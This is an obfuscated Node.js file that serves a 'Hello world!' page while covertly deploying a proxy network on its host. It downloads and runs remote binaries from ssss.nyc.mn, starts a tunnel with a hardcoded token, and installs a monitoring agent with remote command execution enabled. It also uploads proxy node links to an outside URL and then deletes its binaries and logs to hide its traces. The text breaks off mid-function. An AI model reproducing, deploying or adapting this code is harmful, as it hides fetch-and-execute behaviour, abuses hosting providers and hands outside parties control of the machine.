const _0x2767bc=_0x1413;(function(_0x18b556,_0x33c525){const _0x53e0a2=_0x1413,_0x5bbc04=_0x18b556();while(!![]){try{const _0x3f43b1=-parseInt(_0x53e0a2(0x20d))/0x1*(-parseInt(_0x53e0a2(0x185))/0x2)+-parseInt(_0x53e0a2(0x1bd))/0x3*(parseInt(_0x53e0a2(0x15a))/0x4)+parseInt(_0x53e0a2(0x1cc))/0x5+parseInt(_0x53e0a2(0x1e0))/0x6*(-parseInt(_0x53e0a2(0x1f7))/0x7)+-parseInt(_0x53e0a2(0x1e8))/0x8*(-parseInt(_0x53e0a2(0x1d3))/0x9)+-parseInt(_0x53e0a2(0x168))/0xa*(-parseInt(_0x53e0a2(0x197))/0xb)+-parseInt(_0x53e0a2(0x1b4))/0xc*(parseInt(_0x53e0a2(0x1b8))/0xd);if(_0x3f43b1===_0x33c525)break;else _0x5bbc04['push'](_0x5bbc04['shift']());}catch(_0x48efd3){_0x5bbc04['push'](_0x5bbc04['shift']());}}}(_0x4f20,0xc2084));const express=require(_0x2767bc(0x1ca)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x2767bc(0x199)),exec=promisify(require('child_process')[_0x2767bc(0x1aa)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x2767bc(0x18a)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x2767bc(0x18a)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x2767bc(0x18a)][_0x2767bc(0x194)]||![],FILE_PATH=process['env'][_0x2767bc(0x1eb)]||'./tmp',SUB_PATH=process[_0x2767bc(0x18a)]['SUB_PATH']||_0x2767bc(0x1a0),PORT=process[_0x2767bc(0x18a)]['SERVER_PORT']||process[_0x2767bc(0x18a)][_0x2767bc(0x1d5)]||0xbb8,UUID=process['env'][_0x2767bc(0x1f4)]||_0x2767bc(0x1b9),NEZHA_SERVER=process[_0x2767bc(0x18a)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2767bc(0x18a)][_0x2767bc(0x164)]||'',NEZHA_KEY=process['env'][_0x2767bc(0x1b7)]||'',ARGO_DOMAIN=process[_0x2767bc(0x18a)][_0x2767bc(0x205)]||'dfdgds1209.1.d.4.3.0.b.0.0.0.0.7.4.0.1.0.0.2.ip6.arpa',ARGO_AUTH=process[_0x2767bc(0x18a)][_0x2767bc(0x1a7)]||_0x2767bc(0x1c6),ARGO_PORT=process[_0x2767bc(0x18a)][_0x2767bc(0x1ee)]||0x1f41,CFIP=process[_0x2767bc(0x18a)][_0x2767bc(0x1d0)]||_0x2767bc(0x19a),CFPORT=process[_0x2767bc(0x18a)][_0x2767bc(0x166)]||0x1bb,NAME=process[_0x2767bc(0x18a)][_0x2767bc(0x1ac)]||_0x2767bc(0x189);!fs[_0x2767bc(0x17c)](FILE_PATH)?(fs[_0x2767bc(0x1f2)](FILE_PATH),console[_0x2767bc(0x1e7)](FILE_PATH+_0x2767bc(0x170))):console[_0x2767bc(0x1e7)](FILE_PATH+_0x2767bc(0x1e3));function generateRandomName(){const _0x3e36d5=_0x2767bc,_0x291736=_0x3e36d5(0x173);let _0x567831='';for(let _0x203c9a=0x0;_0x203c9a<0x6;_0x203c9a++){_0x567831+=_0x291736['charAt'](Math[_0x3e36d5(0x1e9)](Math[_0x3e36d5(0x178)]()*_0x291736[_0x3e36d5(0x159)]));}return _0x567831;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2767bc(0x1a4)](FILE_PATH,npmName),phpPath=path[_0x2767bc(0x1a4)](FILE_PATH,phpName),webPath=path[_0x2767bc(0x1a4)](FILE_PATH,webName),botPath=path[_0x2767bc(0x1a4)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x2767bc(0x1a4)](FILE_PATH,_0x2767bc(0x15c)),bootLogPath=path[_0x2767bc(0x1a4)](FILE_PATH,'boot.log'),configPath=path[_0x2767bc(0x1a4)](FILE_PATH,_0x2767bc(0x18f));function deleteNodes(){const _0x15730b=_0x2767bc;try{if(!UPLOAD_URL)return;if(!fs[_0x15730b(0x17c)](subPath))return;let _0x26473e;try{_0x26473e=fs[_0x15730b(0x1ce)](subPath,'utf-8');}catch{return null;}const _0x495d21=Buffer[_0x15730b(0x20c)](_0x26473e,_0x15730b(0x165))['toString']('utf-8'),_0x1a0674=_0x495d21[_0x15730b(0x1a9)]('\x0a')[_0x15730b(0x155)](_0x5ac993=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x15730b(0x198)](_0x5ac993));if(_0x1a0674[_0x15730b(0x159)]===0x0)return;return axios['post'](UPLOAD_URL+_0x15730b(0x1bb),JSON[_0x15730b(0x1d9)]({'nodes':_0x1a0674}),{'headers':{'Content-Type':'application/json'}})[_0x15730b(0x183)](_0x390d3d=>{return null;}),null;}catch(_0x5a38b1){return null;}}function cleanupOldFiles(){const _0x1466bd=_0x2767bc;try{const _0x2931e0=fs[_0x1466bd(0x171)](FILE_PATH);_0x2931e0[_0x1466bd(0x19f)](_0x266640=>{const _0x433f75=_0x1466bd,_0x39ab4f=path[_0x433f75(0x1a4)](FILE_PATH,_0x266640);try{const _0x36b3ca=fs[_0x433f75(0x152)](_0x39ab4f);_0x36b3ca[_0x433f75(0x1d6)]()&&fs[_0x433f75(0x1d4)](_0x39ab4f);}catch(_0x872d2a){}});}catch(_0x35824f){}}app[_0x2767bc(0x1a8)]('/',function(_0x3f3aee,_0x1116e0){const _0x3cd322=_0x2767bc;_0x1116e0[_0x3cd322(0x162)](_0x3cd322(0x1cb));});async function generateConfig(){const _0x4aabe6=_0x2767bc,_0xbd88c8={'log':{'access':'/dev/null','error':_0x4aabe6(0x1d2),'loglevel':_0x4aabe6(0x17b)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x4aabe6(0x18e),'dest':0xbba},{'path':_0x4aabe6(0x150),'dest':0xbbb},{'path':_0x4aabe6(0x188),'dest':0xbbc}]},'streamSettings':{'network':_0x4aabe6(0x201)}},{'port':0xbb9,'listen':_0x4aabe6(0x1bf),'protocol':_0x4aabe6(0x1f0),'settings':{'clients':[{'id':UUID}],'decryption':_0x4aabe6(0x17b)},'streamSettings':{'network':_0x4aabe6(0x201),'security':_0x4aabe6(0x17b)}},{'port':0xbba,'listen':_0x4aabe6(0x1bf),'protocol':_0x4aabe6(0x1f0),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4aabe6(0x17b)},'streamSettings':{'network':'ws','security':_0x4aabe6(0x17b),'wsSettings':{'path':_0x4aabe6(0x18e)}},'sniffing':{'enabled':!![],'destOverride':[_0x4aabe6(0x1fc),_0x4aabe6(0x1bc),_0x4aabe6(0x1ef)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4aabe6(0x1bf),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4aabe6(0x1fc),_0x4aabe6(0x1bc),_0x4aabe6(0x1ef)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4aabe6(0x1bf),'protocol':_0x4aabe6(0x209),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4aabe6(0x17b),'wsSettings':{'path':_0x4aabe6(0x188)}},'sniffing':{'enabled':!![],'destOverride':[_0x4aabe6(0x1fc),_0x4aabe6(0x1bc),_0x4aabe6(0x1ef)],'metadataOnly':![]}}],'dns':{'servers':[_0x4aabe6(0x1a3)]},'outbounds':[{'protocol':'freedom','tag':_0x4aabe6(0x1a1)},{'protocol':_0x4aabe6(0x1cf),'tag':'block'}]};fs[_0x4aabe6(0x174)](path[_0x4aabe6(0x1a4)](FILE_PATH,_0x4aabe6(0x18f)),JSON['stringify'](_0xbd88c8,null,0x2));}function _0x4f20(){const _0x3df9f4=['2049tveWqp','data','127.0.0.1','\x20>\x20nul\x202>&1','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','false','https://amd64.ssss.nyc.mn/agent','\x0a\x20\x20credentials-file:\x20','\x20is\x20running','eyJhIjoiNmZmZDkwNDc2ZGY4MDhlOTg1Y2FjY2IyODAxNDBkYjQiLCJ0IjoiNDNhMWY4OTctMzUzMC00ZDI1LTlkYjAtY2U0YTIyZWZiYmIzIiwicyI6Ik9USmpPV1ZsTWpBdFpHVTBNaTAwTW1RNExUZzVPVEF0TXpjNE9UazJNMlJpTldOayJ9','amd','\x22\x20>\x20/dev/null\x202>&1','https://amd64.ssss.nyc.mn/bot','express','Hello\x20world!','7149425zKKmhb','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','readFileSync','blackhole','CFIP','&path=%2Ftrojan-argo%3Fed%3D2560#','/dev/null','9mOEcYO','unlinkSync','PORT','isFile','\x20-p\x20','/tunnel.yml\x20run','stringify','?encryption=none&security=tls&sni=','\x0a\x20\x20\x20\x20','map','https://oooo.serv00.net/add-url','Unknown','includes','3215508BrXVAf','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://arm64.ssss.nyc.mn/bot','\x20already\x20exists','https://arm64.ssss.nyc.mn/v1','utf-8','set','log','10775192IniOav','floor','http\x20server\x20is\x20running\x20on\x20port:','FILE_PATH','--tls','&fp=firefox&type=ws&host=','ARGO_PORT','quic','vless','post','mkdirSync','ArgoDomain:','UUID','platform','status','14VOZsTh','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/api/add-nodes','ARGO_DOMAIN:','Download\x20','http','chmod','countryCode','true','Error\x20executing\x20command:\x20','tcp','2087','https://ipapi.co/json/','https://amd64.ssss.nyc.mn/web','ARGO_DOMAIN','\x20failed:\x20','unlink','config.yaml','trojan','.exe\x20>\x20nul\x202>&1','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','from','82911YrmFFc','/vmess-argo','boot.log','statSync','\x0a\x0avmess://','Error\x20in\x20startserver:','filter','/vmess-argo?ed=2560','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','win32','length','844OFZwuv','del\x20/f\x20/q\x20','list.txt','unshift','clear','substring','all','?security=tls&sni=','send','charAt','NEZHA_PORT','base64','CFPORT','response','10kCFcLl','match','https://amd64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','country_code','\x0a\x20\x20tunnel:\x20','arm','2096','\x20is\x20created','readdirSync','\x20>/dev/null\x202>&1\x20&','abcdefghijklmnopqrstuvwxyz','writeFileSync','aarch64','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0avless://','random','tunnel.yml','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','none','existsSync','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Error\x20reading\x20boot.log:','stream','nohup\x20','tunnel.json','Unhandled\x20error\x20in\x20startserver:','catch','Empowerment\x20failed\x20for\x20','6IoGHJb','pipe','\x20successfully','/trojan-argo','Railway','env','Subscription\x20uploaded\x20successfully','2083','pop','/vless-argo','config.json','Error\x20downloading\x20files:','basename','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','push','AUTO_ACCESS','Skipping\x20adding\x20automatic\x20access\x20task','automatic\x20access\x20task\x20added\x20successfully','5404729kfvgwp','test','util','cdns.doon.eu.org','application/json','App\x20is\x20running','firefox','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','forEach','sub','direct','8443','https+local://8.8.8.8/dns-query','join','rm\x20-rf\x20','2053','ARGO_AUTH','get','split','exec','/api/add-subscriptions','NAME','toString','message','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Nodes\x20uploaded\x20successfully','\x20>/dev/null\x202>&1','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','443','732mnCzkU','close','taskkill\x20/f\x20/im\x20','NEZHA_KEY','320983zzvQel','975bc328-74b2-4b03-a984-be3c6c0813d0','error','/api/delete-nodes','tls'];_0x4f20=function(){return _0x3df9f4;};return _0x4f20();}function getSystemArchitecture(){const _0x1cea58=_0x2767bc,_0x28cac8=os['arch']();return _0x28cac8==='arm'||_0x28cac8==='arm64'||_0x28cac8===_0x1cea58(0x175)?_0x1cea58(0x16e):_0x1cea58(0x1c7);}function downloadFile(_0x124918,_0x2425f7,_0x583230){const _0x3bcf86=_0x2767bc,_0x31e6f8=_0x124918;!fs[_0x3bcf86(0x17c)](FILE_PATH)&&fs[_0x3bcf86(0x1f2)](FILE_PATH,{'recursive':!![]});const _0xf06f7e=fs['createWriteStream'](_0x31e6f8);axios({'method':_0x3bcf86(0x1a8),'url':_0x2425f7,'responseType':_0x3bcf86(0x17f)})['then'](_0x1d9686=>{const _0x4f9e05=_0x3bcf86;_0x1d9686['data'][_0x4f9e05(0x186)](_0xf06f7e),_0xf06f7e['on']('finish',()=>{const _0x5baf53=_0x4f9e05;_0xf06f7e[_0x5baf53(0x1b5)](),console[_0x5baf53(0x1e7)]('Download\x20'+path[_0x5baf53(0x191)](_0x31e6f8)+_0x5baf53(0x187)),_0x583230(null,_0x31e6f8);}),_0xf06f7e['on']('error',_0x3d90d1=>{const _0x167226=_0x4f9e05;fs[_0x167226(0x207)](_0x31e6f8,()=>{});const _0x43941e=_0x167226(0x1fb)+path[_0x167226(0x191)](_0x31e6f8)+_0x167226(0x206)+_0x3d90d1[_0x167226(0x1ae)];console['error'](_0x43941e),_0x583230(_0x43941e);});})[_0x3bcf86(0x183)](_0x35aaf9=>{const _0x1eca3b=_0x3bcf86,_0x3c555a='Download\x20'+path[_0x1eca3b(0x191)](_0x31e6f8)+'\x20failed:\x20'+_0x35aaf9[_0x1eca3b(0x1ae)];console['error'](_0x3c555a),_0x583230(_0x3c555a);});}async function downloadFilesAndRun(){const _0x2cc8b2=_0x2767bc,_0xc6d872=getSystemArchitecture(),_0x59af9a=getFilesForArchitecture(_0xc6d872);if(_0x59af9a[_0x2cc8b2(0x159)]===0x0){console[_0x2cc8b2(0x1e7)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x463751=_0x59af9a[_0x2cc8b2(0x1dc)](_0x5b7e7c=>{return new Promise((_0x27c9ee,_0x52402e)=>{downloadFile(_0x5b7e7c['fileName'],_0x5b7e7c['fileUrl'],(_0x393a21,_0x31be8b)=>{_0x393a21?_0x52402e(_0x393a21):_0x27c9ee(_0x31be8b);});});});try{await Promise[_0x2cc8b2(0x160)](_0x463751);}catch(_0x92d61e){console[_0x2cc8b2(0x1ba)](_0x2cc8b2(0x190),_0x92d61e);return;}function _0xae3554(_0x1479a4){const _0x214b42=_0x2cc8b2,_0x2c62e3=0x1fd;_0x1479a4[_0x214b42(0x19f)](_0x5c9a5f=>{const _0x35c841=_0x214b42;fs[_0x35c841(0x17c)](_0x5c9a5f)&&fs[_0x35c841(0x1fd)](_0x5c9a5f,_0x2c62e3,_0x13aa5a=>{const _0x598988=_0x35c841;_0x13aa5a?console[_0x598988(0x1ba)](_0x598988(0x184)+_0x5c9a5f+':\x20'+_0x13aa5a):console['log']('Empowerment\x20success\x20for\x20'+_0x5c9a5f+':\x20'+_0x2c62e3[_0x598988(0x1ad)](0x8));});});}const _0x1d9585=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xae3554(_0x1d9585);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x408ecc=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x2cc8b2(0x18d)]():'',_0x460458=new Set([_0x2cc8b2(0x1b3),_0x2cc8b2(0x1a2),_0x2cc8b2(0x16f),_0x2cc8b2(0x202),_0x2cc8b2(0x18c),_0x2cc8b2(0x1a6)]),_0x157062=_0x460458['has'](_0x408ecc)?_0x2cc8b2(0x1ff):_0x2cc8b2(0x1c2),_0x37cd23='\x0aclient_secret:\x20'+NEZHA_KEY+_0x2cc8b2(0x17a)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x157062+_0x2cc8b2(0x19e)+UUID;fs[_0x2cc8b2(0x174)](path[_0x2cc8b2(0x1a4)](FILE_PATH,_0x2cc8b2(0x208)),_0x37cd23);const _0x5b67f8=_0x2cc8b2(0x180)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x2cc8b2(0x1f8);try{await exec(_0x5b67f8),console[_0x2cc8b2(0x1e7)](phpName+_0x2cc8b2(0x1c5)),await new Promise(_0x31e4fa=>setTimeout(_0x31e4fa,0x3e8));}catch(_0x2a4265){console[_0x2cc8b2(0x1ba)]('php\x20running\x20error:\x20'+_0x2a4265);}}else{let _0x13b655='';const _0x2f2c61=['443',_0x2cc8b2(0x1a2),_0x2cc8b2(0x16f),_0x2cc8b2(0x202),_0x2cc8b2(0x18c),'2053'];_0x2f2c61[_0x2cc8b2(0x1df)](NEZHA_PORT)&&(_0x13b655=_0x2cc8b2(0x1ec));const _0x42b091='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x2cc8b2(0x1d7)+NEZHA_KEY+'\x20'+_0x13b655+_0x2cc8b2(0x20b);try{await exec(_0x42b091),console[_0x2cc8b2(0x1e7)](npmName+_0x2cc8b2(0x1c5)),await new Promise(_0x2dc97f=>setTimeout(_0x2dc97f,0x3e8));}catch(_0x20b111){console[_0x2cc8b2(0x1ba)]('npm\x20running\x20error:\x20'+_0x20b111);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x16cc5d=_0x2cc8b2(0x180)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x16cc5d),console[_0x2cc8b2(0x1e7)](webName+'\x20is\x20running'),await new Promise(_0x4682f0=>setTimeout(_0x4682f0,0x3e8));}catch(_0x6cd97e){console[_0x2cc8b2(0x1ba)]('web\x20running\x20error:\x20'+_0x6cd97e);}if(fs[_0x2cc8b2(0x17c)](botPath)){let _0x40b0da;if(ARGO_AUTH[_0x2cc8b2(0x169)](/^[A-Z0-9a-z=]{120,250}$/))_0x40b0da=_0x2cc8b2(0x16b)+ARGO_AUTH;else ARGO_AUTH[_0x2cc8b2(0x169)](/TunnelSecret/)?_0x40b0da=_0x2cc8b2(0x157)+FILE_PATH+_0x2cc8b2(0x1d8):_0x40b0da='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2cc8b2(0x1e1)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x40b0da+_0x2cc8b2(0x172)),console[_0x2cc8b2(0x1e7)](botName+'\x20is\x20running'),await new Promise(_0x3bbfa1=>setTimeout(_0x3bbfa1,0x7d0));}catch(_0x1eff0d){console[_0x2cc8b2(0x1ba)](_0x2cc8b2(0x200)+_0x1eff0d);}}await new Promise(_0xd0ea91=>setTimeout(_0xd0ea91,0x1388));}function getFilesForArchitecture(_0x6b4354){const _0x383d63=_0x2767bc;let _0x5a0e00;_0x6b4354===_0x383d63(0x16e)?_0x5a0e00=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x383d63(0x1e2)}]:_0x5a0e00=[{'fileName':webPath,'fileUrl':_0x383d63(0x204)},{'fileName':botPath,'fileUrl':_0x383d63(0x1c9)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x8b2c21=_0x6b4354===_0x383d63(0x16e)?'https://arm64.ssss.nyc.mn/agent':_0x383d63(0x1c3);_0x5a0e00[_0x383d63(0x15d)]({'fileName':npmPath,'fileUrl':_0x8b2c21});}else{const _0x2eea7e=_0x6b4354===_0x383d63(0x16e)?_0x383d63(0x1e4):_0x383d63(0x16a);_0x5a0e00[_0x383d63(0x15d)]({'fileName':phpPath,'fileUrl':_0x2eea7e});}}return _0x5a0e00;}function argoType(){const _0x1ff7cb=_0x2767bc;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x1ff7cb(0x1e7)](_0x1ff7cb(0x17d));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x1ff7cb(0x174)](path[_0x1ff7cb(0x1a4)](FILE_PATH,_0x1ff7cb(0x181)),ARGO_AUTH);const _0x29f398=_0x1ff7cb(0x16d)+ARGO_AUTH[_0x1ff7cb(0x1a9)]('\x22')[0xb]+_0x1ff7cb(0x1c4)+path[_0x1ff7cb(0x1a4)](FILE_PATH,_0x1ff7cb(0x181))+_0x1ff7cb(0x1cd)+ARGO_DOMAIN+_0x1ff7cb(0x1af)+ARGO_PORT+_0x1ff7cb(0x1c1);fs['writeFileSync'](path[_0x1ff7cb(0x1a4)](FILE_PATH,_0x1ff7cb(0x179)),_0x29f398);}else console[_0x1ff7cb(0x1e7)](_0x1ff7cb(0x1b2));}async function extractDomains(){const _0x9fb095=_0x2767bc;let _0x3d652d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3d652d=ARGO_DOMAIN,console[_0x9fb095(0x1e7)](_0x9fb095(0x1fa),_0x3d652d),await _0x3aacf5(_0x3d652d);else try{const _0x278813=fs[_0x9fb095(0x1ce)](path['join'](FILE_PATH,_0x9fb095(0x151)),_0x9fb095(0x1e5)),_0x4d1b59=_0x278813[_0x9fb095(0x1a9)]('\x0a'),_0x555a0d=[];_0x4d1b59[_0x9fb095(0x19f)](_0xbb7a2a=>{const _0x47f0aa=_0x9fb095,_0x1ca72c=_0xbb7a2a[_0x47f0aa(0x169)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1ca72c){const _0x223a82=_0x1ca72c[0x1];_0x555a0d[_0x47f0aa(0x193)](_0x223a82);}});if(_0x555a0d[_0x9fb095(0x159)]>0x0)_0x3d652d=_0x555a0d[0x0],console[_0x9fb095(0x1e7)](_0x9fb095(0x1f3),_0x3d652d),await _0x3aacf5(_0x3d652d);else{console[_0x9fb095(0x1e7)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x9fb095(0x1d4)](path[_0x9fb095(0x1a4)](FILE_PATH,_0x9fb095(0x151)));async function _0x2293fa(){const _0x3c77a7=_0x9fb095;try{process[_0x3c77a7(0x1f5)]===_0x3c77a7(0x158)?await exec(_0x3c77a7(0x1b6)+botName+_0x3c77a7(0x20a)):await exec('pkill\x20-f\x20\x22['+botName[_0x3c77a7(0x163)](0x0)+']'+botName[_0x3c77a7(0x15f)](0x1)+_0x3c77a7(0x1c8));}catch(_0x53edab){}}_0x2293fa(),await new Promise(_0xfee290=>setTimeout(_0xfee290,0xbb8));const _0x46cd09=_0x9fb095(0x192)+FILE_PATH+_0x9fb095(0x1e1)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x46cd09+_0x9fb095(0x172)),console['log'](botName+_0x9fb095(0x1c5)),await new Promise(_0x409a0b=>setTimeout(_0x409a0b,0xbb8)),await extractDomains();}catch(_0x455d00){console[_0x9fb095(0x1ba)]('Error\x20executing\x20command:\x20'+_0x455d00);}}}catch(_0x2e8a76){console['error'](_0x9fb095(0x17e),_0x2e8a76);}async function _0x37f40b(){const _0x94e076=_0x9fb095;try{const _0x292455=await axios['get'](_0x94e076(0x203),{'timeout':0xbb8});if(_0x292455[_0x94e076(0x1be)]&&_0x292455['data']['country_code']&&_0x292455[_0x94e076(0x1be)]['org'])return _0x292455[_0x94e076(0x1be)][_0x94e076(0x16c)]+'_'+_0x292455[_0x94e076(0x1be)]['org'];}catch(_0x59cf1f){try{const _0x570d5e=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x570d5e[_0x94e076(0x1be)]&&_0x570d5e['data'][_0x94e076(0x1f6)]==='success'&&_0x570d5e[_0x94e076(0x1be)][_0x94e076(0x1fe)]&&_0x570d5e[_0x94e076(0x1be)]['org'])return _0x570d5e[_0x94e076(0x1be)][_0x94e076(0x1fe)]+'_'+_0x570d5e[_0x94e076(0x1be)]['org'];}catch(_0x667adf){}}return _0x94e076(0x1de);}async function _0x3aacf5(_0x308faf){const _0x510f56=await _0x37f40b(),_0x262a45=NAME?NAME+'-'+_0x510f56:_0x510f56;return new Promise(_0x3e3211=>{setTimeout(()=>{const _0x893142=_0x1413,_0x1cc469={'v':'2','ps':''+_0x262a45,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x893142(0x17b),'net':'ws','type':_0x893142(0x17b),'host':_0x308faf,'path':_0x893142(0x156),'tls':_0x893142(0x1bc),'sni':_0x308faf,'alpn':'','fp':_0x893142(0x19d)},_0x44ef25=_0x893142(0x177)+UUID+'@'+CFIP+':'+CFPORT+_0x893142(0x1da)+_0x308faf+_0x893142(0x1ed)+_0x308faf+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x262a45+_0x893142(0x153)+Buffer['from'](JSON[_0x893142(0x1d9)](_0x1cc469))[_0x893142(0x1ad)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x893142(0x161)+_0x308faf+_0x893142(0x1ed)+_0x308faf+_0x893142(0x1d1)+_0x262a45+_0x893142(0x1db);console[_0x893142(0x1e7)](Buffer['from'](_0x44ef25)[_0x893142(0x1ad)](_0x893142(0x165))),fs[_0x893142(0x174)](subPath,Buffer[_0x893142(0x20c)](_0x44ef25)['toString'](_0x893142(0x165))),console[_0x893142(0x1e7)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x893142(0x1a8)]('/'+SUB_PATH,(_0x3b28a7,_0x5a4f51)=>{const _0x13fe83=_0x893142,_0x429eec=Buffer['from'](_0x44ef25)[_0x13fe83(0x1ad)]('base64');_0x5a4f51[_0x13fe83(0x1e6)]('Content-Type','text/plain;\x20charset=utf-8'),_0x5a4f51[_0x13fe83(0x162)](_0x429eec);}),_0x3e3211(_0x44ef25);},0x7d0);});}}async function uploadNodes(){const _0x38dd79=_0x2767bc;if(UPLOAD_URL&&PROJECT_URL){const _0x11af1e=PROJECT_URL+'/'+SUB_PATH,_0x20cfc8={'subscription':[_0x11af1e]};try{const _0x51bca4=await axios[_0x38dd79(0x1f1)](UPLOAD_URL+_0x38dd79(0x1ab),_0x20cfc8,{'headers':{'Content-Type':_0x38dd79(0x19b)}});return _0x51bca4&&_0x51bca4[_0x38dd79(0x1f6)]===0xc8?(console[_0x38dd79(0x1e7)](_0x38dd79(0x18b)),_0x51bca4):null;}catch(_0x504893){if(_0x504893[_0x38dd79(0x167)]){if(_0x504893[_0x38dd79(0x167)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x38dd79(0x17c)](listPath))return;const _0x5cf36e=fs[_0x38dd79(0x1ce)](listPath,'utf-8'),_0x2237a6=_0x5cf36e[_0x38dd79(0x1a9)]('\x0a')[_0x38dd79(0x155)](_0x510953=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x38dd79(0x198)](_0x510953));if(_0x2237a6[_0x38dd79(0x159)]===0x0)return;const _0x3737bf=JSON[_0x38dd79(0x1d9)]({'nodes':_0x2237a6});try{const _0x58166b=await axios[_0x38dd79(0x1f1)](UPLOAD_URL+_0x38dd79(0x1f9),_0x3737bf,{'headers':{'Content-Type':_0x38dd79(0x19b)}});return _0x58166b&&_0x58166b[_0x38dd79(0x1f6)]===0xc8?(console[_0x38dd79(0x1e7)](_0x38dd79(0x1b0)),_0x58166b):null;}catch(_0x1f2cd7){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x48203d=_0x1413,_0x1bb219=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1bb219[_0x48203d(0x193)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1bb219[_0x48203d(0x193)](phpPath);process[_0x48203d(0x1f5)]===_0x48203d(0x158)?exec(_0x48203d(0x15b)+_0x1bb219[_0x48203d(0x1a4)]('\x20')+_0x48203d(0x1c0),_0x3d7ba0=>{const _0x75317f=_0x48203d;console[_0x75317f(0x15e)](),console[_0x75317f(0x1e7)](_0x75317f(0x19c)),console[_0x75317f(0x1e7)](_0x75317f(0x176));}):exec(_0x48203d(0x1a5)+_0x1bb219[_0x48203d(0x1a4)]('\x20')+_0x48203d(0x1b1),_0x506447=>{const _0x19396b=_0x48203d;console[_0x19396b(0x15e)](),console[_0x19396b(0x1e7)]('App\x20is\x20running'),console[_0x19396b(0x1e7)](_0x19396b(0x176));});},0x15f90);}function _0x1413(_0x579bb3,_0x4eea09){_0x579bb3=_0x579bb3-0x150;const _0x4f20ec=_0x4f20();let _0x14136b=_0x4f20ec[_0x579bb3];return _0x14136b;}cleanFiles();async function AddVisitTask(){const 